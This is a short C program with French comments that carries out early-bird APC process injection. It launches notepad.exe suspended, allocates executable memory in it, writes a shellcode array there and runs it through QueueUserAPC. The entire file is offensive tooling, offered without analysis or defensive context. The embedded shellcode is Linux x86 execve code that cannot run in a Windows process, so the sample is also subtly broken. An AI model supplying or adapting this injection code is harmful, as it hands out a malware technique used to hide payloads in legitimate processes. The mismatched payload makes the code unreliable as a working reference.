#include <windows.h>
#include <stdio.h>

int main() {
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    char targetPath[] = "C:\\Windows\\System32\\notepad.exe"; // Processus cible
    unsigned char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"; // Shellcode

    // Création d'un processus suspendu (notepad.exe)
    if (CreateProcess(NULL, targetPath, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        // Allocation de mémoire dans le processus cible
        LPVOID remoteMemory = VirtualAllocEx(pi.hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (remoteMemory) {
            // Injection du shellcode dans la mémoire du processus
            WriteProcessMemory(pi.hProcess, remoteMemory, shellcode, sizeof(shellcode), NULL);

            // Exécution du shellcode dans le processus cible
            QueueUserAPC((PAPCFUNC)remoteMemory, pi.hThread, 0);
            ResumeThread(pi.hThread);
        }
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    return 0;
}